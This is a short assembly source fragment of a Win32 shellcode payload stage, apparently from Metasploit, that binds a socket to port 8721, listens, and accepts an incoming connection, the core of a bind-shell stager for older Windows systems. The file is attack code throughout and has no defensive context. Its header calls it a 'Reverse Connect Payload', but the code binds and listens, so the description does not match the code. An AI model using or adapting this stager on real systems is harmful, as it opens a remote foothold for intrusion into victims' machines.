;      Title:  Win32 Reverse Connect Payload
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com



[BITS 32]

%include "win32_stage_boot_winsock_bind.asm"


LBind:
    xor ebx, ebx
    push ebx
    push ebx
    push dword 0x11220002 ; port 8721
    mov eax, esp
    push byte 0x10        ; length
    push eax
    push edi
    call FN_BIND

LListen:
    push ebx
    push edi
    call FN_LISTEN

LAccept:
    push ebx
    push esp
    push edi
    call FN_ACCEPT
    mov edi, eax
